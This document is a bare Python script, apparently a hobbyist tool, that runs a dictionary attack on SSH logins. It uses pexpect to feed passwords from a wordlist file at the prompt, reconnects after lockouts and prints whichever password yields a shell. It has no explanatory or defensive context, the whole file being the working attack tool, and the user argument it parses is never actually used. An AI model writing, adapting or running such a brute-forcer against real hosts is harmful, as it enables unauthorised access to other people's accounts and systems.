
import sys
import pexpect

host = "127.0.0.1"
user = "root"
PROMPT = "[#|>>>|>|$]"

if(len(sys.argv)>1):
    host = sys.argv[1]

if(len(sys.argv)>2):
    user = sys.argv[2]

f = open("words.txt")

passes = f.readlines()
f.close()

child = pexpect.spawn("ssh " + host)
child.expect("[P|p]assword:")

for p in passes:
    print(p)
    child.send(p)
    ret = child.expect([pexpect.TIMEOUT,"[P|p]assword:",PROMPT,"(publickey,password)."])
    if(ret == 2):
        print(p)
        exit(0)
    elif(ret == 3):
        child = pexpect.spawn("ssh " + host)
        child.expect("[P|p]assword:")

print("Wordlist exhausted. No matches. Exiting.")



